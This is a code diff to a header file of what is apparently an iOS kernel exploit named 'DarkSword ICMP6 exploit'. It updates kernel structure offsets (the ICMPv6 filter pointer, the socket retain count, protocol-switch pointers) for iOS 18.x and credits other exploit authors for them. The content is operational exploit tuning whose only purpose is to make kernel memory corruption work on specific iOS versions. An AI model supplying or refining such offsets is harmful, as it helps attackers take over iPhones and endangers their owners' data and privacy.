@@ -16,14 +16,20 @@
 #define PAGE_SIZE 0x4000ULL
 
 // ===== DarkSword ICMP6 exploit offsets =====
-// wh1te4ever / ClearSword (TheRealClarity) verified offsets for iOS 18.x:
-//   inpcb_icmp6filt = 0x148, socket_so_count = 0x254 (iOS 18.0+)
-// (the 0x138+0x18=0x150 / 0x228 values are for iOS <= 17.0)
-#define OFFSET_PCB_SOCKET      0x40   // inpcb -> socket
-#define OFFSET_SOCKET_SO_COUNT 0x254  // socket retain count (iOS 18.x)
-#define OFFSET_ICMP6FILT       0x148  // inpcb icmp6_filter pointer (iOS 18.x)
-#define OFFSET_SO_PROTO        0x18   // socket -> protosw
-#define OFFSET_PR_INPUT        0x28   // protosw -> pr_input
+// VERIFIED for iOS 18.2.1 / xnu-11215 (darksword-kexploit-main, "OFFICIAL
+// CORRECTED OFFSETS ... XNU-11215.61.5 source struct compilation"):
+//   OFFSET_ICMP6FILT = 0x138 (0x150 was a stale +0x18 inner-struct bug)
+//   OFFSET_SOCKET_SO_COUNT = 0x208 (so_retaincnt; was 0x228 pre-XNU-11215,
+//      moved to 0x254 in iOS 18.4 / xnu-11417 per Kev1nLevin disasm)
+//   OFFSET_SO_PROTO = 0x20 (was 0x18, moved +0x08 in XNU-11215)
+// Cross-check (iOS 18.4 / xnu-11417): ICMP6FILT 0x138, SO_COUNT 0x254,
+// SO_PROTO 0x20, PR_INPUT 0x20 -- so ICMP6FILT/SO_PROTO are stable across
+// the 18.x line; only SO_COUNT differs (0x208 here vs 0x254 on 18.4+).
+#define OFFSET_PCB_SOCKET      0x40   // inpcb -> socket (unchanged 15.x-18.4)
+#define OFFSET_SOCKET_SO_COUNT 0x208  // socket so_retaincnt (iOS 18.0-18.3.x)
+#define OFFSET_ICMP6FILT       0x138  // inpcb icmp6_filter pointer (18.x)
+#define OFFSET_SO_PROTO        0x20   // socket -> protosw (18.x)
+#define OFFSET_PR_INPUT        0x28   // protosw -> pr_input (18.2.x)
 
 // ICMP6 socket option
 #define IPPROTO_ICMPV6  58
